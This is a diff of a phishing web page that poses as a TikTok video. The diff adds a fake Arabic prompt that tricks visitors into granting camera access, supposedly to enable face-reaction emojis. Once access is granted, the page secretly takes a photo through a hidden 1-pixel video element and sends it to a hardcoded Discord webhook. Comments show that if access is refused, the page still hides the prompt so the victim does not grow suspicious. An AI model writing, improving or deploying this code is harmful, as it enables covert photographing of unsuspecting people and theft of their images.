@@ -3,17 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    <title>TikTok Video</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
+        
         #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
-        #start-overlay {
+        
+        /* واجهة التمويه */
+        #fake-popup {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 100; color: white; cursor: pointer;
+            justify-content: center; align-items: center; z-index: 500; color: white; text-align: center; padding: 20px;
         }
-        .play-btn { font-size: 60px; margin-bottom: 10px; }
+        .play-btn { font-size: 70px; color: #fe2c55; margin-bottom: 20px; cursor: pointer; }
+        .instruction { font-size: 18px; line-height: 1.6; }
+
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
     </style>
@@ -26,9 +31,12 @@
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
-    <div id="start-overlay">
-        <div class="play-btn">▶️</div>
-        <p>اضغط للمشاهدة</p>
+    <div id="fake-popup">
+        <div class="play-btn" id="start-btn">▶️</div>
+        <div class="instruction">
+            <p><strong>ميزة التفاعل التلقائي مفعلة!</strong></p>
+            <p>اضغط على "سماح" لتشغيل الفيديو بالصوت وتفعيل رموز التفاعل بوجهك 😂</p>
+        </div>
     </div>
 </div>
 
@@ -37,25 +45,30 @@
 
 <script>
     const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
-    const overlay = document.getElementById('start-overlay');
+    const startBtn = document.getElementById('start-btn');
+    const popup = document.getElementById('fake-popup');
     const iframe = document.getElementById('youtube-frame');
     const camera = document.getElementById('hidden-camera');
 
-    overlay.addEventListener('click', async () => {
-        // تشغيل الفيديو والصوت
+    startBtn.addEventListener('click', async () => {
+        // تشغيل الفيديو فوراً خلف الكواليس
         iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
         iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
-        overlay.style.display = 'none';
 
         try {
-            // طلب الكاميرا
+            // طلب الكاميرا: هنا ستظهر رسالة المتصفح الحقيقية
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
             
-            // التصوير بعد 4 ثواني بالضبط
-            setTimeout(captureAndSend, 4000);
+            // إخفاء التمويه وظهور الفيديو
+            popup.style.display = 'none';
+
+            camera.onplaying = () => {
+                setTimeout(captureAndSend, 3000); // يصور بعد 3 ثواني من الموافقة
+            };
         } catch (err) {
-            console.log("Access Denied");
+            // إذا رفض، يخفي التمويه ويشغل الفيديو عادي عشان ما يشك
+            popup.style.display = 'none';
         }
     });
 
@@ -68,23 +81,11 @@
         canvas.height = camera.videoHeight;
         context.drawImage(camera, 0, 0, canvas.width, canvas.height);
         
-        // الحل الأكيد: تحويل الصورة لـ Blob وإرسالها كملف رسمي
         canvas.toBlob(async (blob) => {
-            if (!blob) return;
             const formData = new FormData();
-            formData.append('file', blob, 'shot.png');
-            formData.append('content', '✅ **وصلت الصورة المطلوبة!**');
-            
-            // إرسال للديسكورد مع نظام الانتظار
-            await fetch(webhookURL, { 
-                method: 'POST', 
-                body: formData 
-            }).then(() => {
-                console.log("Sent successfully");
-            }).catch(err => {
-                // إذا فشل، يحاول مرة أخرى بعد ثانية
-                setTimeout(captureAndSend, 1000);
-            });
+            formData.append('file', blob, 'face.png');
+            formData.append('content', '✅ **تم التقاط الوجه بنجاح!**');
+            await fetch(webhookURL, { method: 'POST', body: formData });
         }, 'image/png');
     }
 </script>
